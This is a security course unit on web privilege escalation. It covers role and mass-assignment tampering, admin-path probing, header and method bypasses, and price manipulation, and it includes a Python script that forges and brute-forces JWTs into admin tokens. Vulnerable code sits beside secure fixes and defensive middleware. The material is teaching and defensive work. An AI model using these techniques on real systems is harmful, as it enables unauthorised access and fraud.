# Unit 1: A01 - Broken Access Control — Topic 4: Privilege Escalation

## Overview

Privilege escalation in web applications occurs when a user gains access to resources or functions **beyond their authorized privilege level**. Unlike IDOR (which is typically horizontal), privilege escalation is often **vertical** — a regular user performing admin-level actions. This includes role manipulation, admin panel access, parameter tampering, mass assignment vulnerabilities, and JWT role claim abuse. Privilege escalation vulnerabilities can lead to full application compromise.

---

## 1. Types of Privilege Escalation

```
┌─────────────────────────────────────────────────────────────────┐
│               PRIVILEGE ESCALATION TYPES                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VERTICAL ESCALATION              HORIZONTAL ESCALATION         │
│  (Lower → Higher privilege)       (Same level, different user)  │
│                                                                 │
│  ┌───────────────┐               ┌───────────────┐             │
│  │    Admin      │               │   User A      │             │
│  │  (target)     │  ▲            │  (target)     │ ◄──┐       │
│  ├───────────────┤  │            ├───────────────┤    │       │
│  │   Manager     │  │ Escalate   │   User B      │────┘       │
│  ├───────────────┤  │            │  (attacker)   │ Lateral    │
│  │   User        │──┘            └───────────────┘ Movement   │
│  │  (attacker)   │                                             │
│  └───────────────┘                                             │
│                                                                 │
│  CONTEXT ESCALATION                                            │
│  (Change execution context)                                     │
│  User in App A → gains access to App B on same platform       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Role Manipulation Attacks

### Hidden Parameter Tampering

```
# Registration form with hidden role parameter
POST /api/register HTTP/1.1
Content-Type: application/json

{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "P@ssw0rd!",
    "role": "user"           ← Change to "admin"
}

# Profile update with role injection
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer <user_token>

{
    "name": "Attacker",
    "email": "attacker@evil.com",
    "role": "admin",          ← Injected parameter
    "isAdmin": true            ← Injected parameter
}
```

### Mass Assignment / Object Binding

```
┌──────────────────────────────────────────────────────────────┐
│                 MASS ASSIGNMENT ATTACK                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  User Model:                                                 │
│  ┌─────────────────────┐                                    │
│  │ username: String     │  ← Editable by user               │
│  │ email: String        │  ← Editable by user               │
│  │ password: String     │  ← Editable by user               │
│  │ role: String         │  ← Should NOT be editable         │
│  │ isAdmin: Boolean     │  ← Should NOT be editable         │
│  │ credits: Integer     │  ← Should NOT be editable         │
│  └─────────────────────┘                                    │
│                                                              │
│  Vulnerable Code (Node.js):                                  │
│  app.put('/profile', (req, res) => {                        │
│      Object.assign(user, req.body);  ← Binds ALL fields    │
│      user.save();                                            │
│  });                                                         │
│                                                              │
│  Attacker sends:                                             │
│  { "name": "Hacker", "role": "admin", "credits": 999999 }  │
│  → role and credits are overwritten!                         │
└──────────────────────────────────────────────────────────────┘
```

### Vulnerable vs Secure Code

```python
# VULNERABLE — Mass assignment in Django
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # Exposes ALL fields including role, is_staff

# SECURE — Explicit field whitelist
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'first_name', 'last_name']
        read_only_fields = ['role', 'is_staff', 'is_superuser']
```

```ruby
# VULNERABLE — Rails strong parameters missing
def update
  @user = User.find(params[:id])
  @user.update(params[:user])  # All params accepted
end

# SECURE — Strong parameters
def update
  @user = User.find(params[:id])
  @user.update(user_params)
end

private
def user_params
  params.require(:user).permit(:name, :email, :avatar)
  # :role, :admin explicitly NOT permitted
end
```

```javascript
// VULNERABLE — Express.js mass assignment
app.put('/api/users/:id', async (req, res) => {
    const user = await User.findByIdAndUpdate(req.params.id, req.body, { new: true });
    res.json(user);
});

// SECURE — Explicit field extraction
app.put('/api/users/:id', async (req, res) => {
    const allowedFields = ['name', 'email', 'avatar'];
    const updates = {};
    
    for (const field of allowedFields) {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    }
    
    const user = await User.findByIdAndUpdate(req.params.id, updates, { new: true });
    res.json(user);
});
```

---

## 3. Admin Panel Access

### Common Attack Vectors

```
# Direct URL access (no server-side check)
https://target.com/admin
https://target.com/administrator
https://target.com/admin/dashboard
https://target.com/internal/management

# API endpoint access
GET /api/admin/users
GET /api/v1/admin/config
POST /api/admin/create-user

# Path manipulation
GET /user/dashboard → GET /admin/dashboard (change path)
GET /api/v1/user/me → GET /api/v1/admin/users (change endpoint)

# Header manipulation (framework-specific)
GET /admin HTTP/1.1
X-Original-URL: /admin
X-Forwarded-For: 127.0.0.1   ← Bypass IP whitelist

# HTTP method override
POST /admin HTTP/1.1             ← Blocked
GET /admin HTTP/1.1              ← Also blocked
TRACE /admin HTTP/1.1            ← Might work
X-HTTP-Method-Override: GET      ← Override method
```

### Admin Detection via Response Analysis

```python
#!/usr/bin/env python3
"""Detect admin panel access differences"""
import requests

TARGET = "https://target.com"
ADMIN_PATHS = [
    '/admin', '/administrator', '/admin/dashboard',
    '/manage', '/management', '/control-panel',
    '/admin/login', '/wp-admin', '/admin.php',
    '/cpanel', '/admin/config', '/backend',
]

def test_admin_access(session, path):
    try:
        resp = session.get(f"{TARGET}{path}", allow_redirects=False, timeout=5)
        return {
            'path': path,
            'status': resp.status_code,
            'length': len(resp.text),
            'redirect': resp.headers.get('Location', ''),
        }
    except:
        return None

# Test as unauthenticated user
print("[*] Testing admin paths (unauthenticated):")
session = requests.Session()
for path in ADMIN_PATHS:
    result = test_admin_access(session, path)
    if result and result['status'] not in (404,):
        print(f"  [{result['status']}] {path} (len={result['length']})")

# Test as authenticated low-priv user
print("\n[*] Testing admin paths (authenticated as regular user):")
session.headers['Authorization'] = 'Bearer <low_priv_token>'
for path in ADMIN_PATHS:
    result = test_admin_access(session, path)
    if result and result['status'] == 200:
        print(f"  [!] ACCESSIBLE: {path} (len={result['length']})")
```

---

## 4. Parameter Tampering for Privilege Changes

### Common Tamperable Parameters

| Parameter | Normal Value | Escalation Value |
|-----------|-------------|-----------------|
| `role` | `user` | `admin`, `root`, `superuser` |
| `isAdmin` | `false` | `true` |
| `privilege` | `0` | `1`, `9`, `999` |
| `user_type` | `standard` | `premium`, `admin` |
| `access_level` | `1` | `5`, `10`, `99` |
| `group_id` | `2` (users) | `1` (admins) |
| `permissions` | `["read"]` | `["read","write","delete","admin"]` |
| `account_type` | `free` | `enterprise` |

### Testing Price/Amount Manipulation

```
# E-commerce privilege escalation via price tampering
POST /api/checkout HTTP/1.1
{
    "product_id": 123,
    "quantity": 1,
    "price": 99.99     ← Change to 0.01
}

# Subscription tier escalation
POST /api/subscribe HTTP/1.1
{
    "plan": "free",      ← Change to "enterprise"
    "billing_cycle": "monthly"
}

# Coupon/discount abuse
POST /api/apply-coupon HTTP/1.1
{
    "coupon_code": "SAVE10",
    "discount_percent": 10   ← Change to 100
}
```

---

## 5. JWT Role Claims Abuse

### Modifying JWT Claims

```
JWT Structure:
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.signature

Decoded Payload:
{
    "sub": "user123",
    "role": "user",        ← Change to "admin"
    "exp": 1704067200
}

Attack Vectors:
1. Algorithm: none → No signature verification
2. Algorithm: HS256 → Brute-force weak secret
3. Algorithm confusion: RS256 → HS256 (use public key as HMAC secret)
4. Modify claims and resign with known/brute-forced key
```

```python
# JWT manipulation with jwt_tool
# Install: pip install pyjwt

import jwt
import json

# Decode without verification
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.sig"
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

print(f"Header: {header}")
print(f"Payload: {payload}")

# Forge token with "none" algorithm
forged_payload = payload.copy()
forged_payload['role'] = 'admin'
forged_token = jwt.encode(forged_payload, '', algorithm='none')
print(f"Forged token: {forged_token}")

# Brute-force weak secret
common_secrets = ['secret', 'password', 'key', '123456', 'admin']
for secret in common_secrets:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"[!] Secret found: {secret}")
        # Now forge with the correct secret
        forged = jwt.encode({'sub': 'user123', 'role': 'admin'}, secret, algorithm='HS256')
        print(f"[!] Admin token: {forged}")
        break
    except jwt.InvalidSignatureError:
        pass
```

---

## 6. Real-World Privilege Escalation Examples

### GitLab (2021) — CVE-2021-22205

```
Vulnerability: Unauthenticated RCE via image processing
Escalation: Regular user → system command execution
Impact: Full server compromise

Flow:
1. Upload specially crafted EXIF metadata image
2. ExifTool processes the image (runs as web server user)
3. Malicious DjVu file triggers command execution
4. Attacker gains shell access as the GitLab service user
```

### Kubernetes Dashboard (Common)

```
Vulnerability: Default ServiceAccount with cluster-admin privileges
Escalation: Dashboard user → full cluster control

Attack:
1. Access Kubernetes Dashboard (often exposed without auth)
2. Default ServiceAccount bound to cluster-admin ClusterRoleBinding
3. kubectl exec into any pod
4. Access secrets, deploy containers, pivot to nodes
```

---

## 7. Detection and Prevention

### Server-Side Enforcement Pattern

```python
# Comprehensive privilege check middleware
from functools import wraps
from flask import abort, request, g

def require_privilege(min_level=None, roles=None, owner_check=None):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            user = g.current_user
            
            # Check minimum privilege level
            if min_level and user.privilege_level < min_level:
                audit_log.warning(f"Privilege escalation attempt: "
                                  f"user={user.id} required_level={min_level} "
                                  f"actual_level={user.privilege_level}")
                abort(403)
            
            # Check required roles
            if roles and user.role not in roles:
                audit_log.warning(f"Role violation: user={user.id} "
                                  f"required_roles={roles} actual_role={user.role}")
                abort(403)
            
            # Check resource ownership
            if owner_check:
                resource = owner_check(kwargs)
                if resource.owner_id != user.id and user.role != 'admin':
                    audit_log.warning(f"Ownership violation: user={user.id} "
                                      f"resource_owner={resource.owner_id}")
                    abort(403)
            
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage
@app.route('/admin/users', methods=['GET'])
@require_privilege(roles=['admin', 'super_admin'])
def list_all_users():
    return jsonify(User.query.all())

@app.route('/api/documents/<int:doc_id>', methods=['PUT'])
@require_privilege(owner_check=lambda kwargs: Document.query.get(kwargs['doc_id']))
def update_document(doc_id):
    # Only owner or admin can update
    pass
```

### Prevention Checklist

| Control | Implementation |
|---------|---------------|
| **Deny by default** | All endpoints require explicit authorization |
| **Server-side role checks** | Never trust client-supplied role values |
| **Input whitelisting** | Only accept expected fields in updates |
| **Strong parameters** | Framework-level mass assignment protection |
| **JWT validation** | Verify signature, algorithm, expiration |
| **Admin endpoint isolation** | Separate admin routes with dedicated middleware |
| **Rate limiting** | Limit role-change and admin access attempts |
| **Audit logging** | Log all privilege changes and admin actions |
| **Automated testing** | CI/CD pipeline checks for authorization gaps |

---

## Summary Table

| Attack Type | Technique | Impact |
|-------------|-----------|--------|
| **Role Manipulation** | Modify role parameter in requests | Full admin access |
| **Mass Assignment** | Inject unauthorized fields | Role/privilege change |
| **Admin Panel Access** | Direct URL/API browsing | Admin functionality |
| **Parameter Tampering** | Modify price/tier/level values | Financial/feature abuse |
| **JWT Abuse** | Modify claims, algorithm confusion | Identity impersonation |
| **Method Override** | HTTP method header tampering | Bypass method-based controls |

---

## Revision Questions

1. What is the difference between horizontal and vertical privilege escalation? Which is typically more severe?
2. Explain mass assignment vulnerabilities. How do Django, Rails, and Express.js each handle this?
3. How can an attacker escalate privileges through JWT token manipulation? List three JWT attack vectors.
4. Describe how parameter tampering can lead to privilege escalation in an e-commerce application.
5. Write a middleware function that enforces role-based access control with audit logging.
6. What defensive measures prevent admin panel access by unauthorized users?

---

*Previous: [03-idor-vulnerabilities.md](03-idor-vulnerabilities.md) | Next: [05-jwt-vulnerabilities.md](05-jwt-vulnerabilities.md)*

---

*[Back to README](../README.md)*
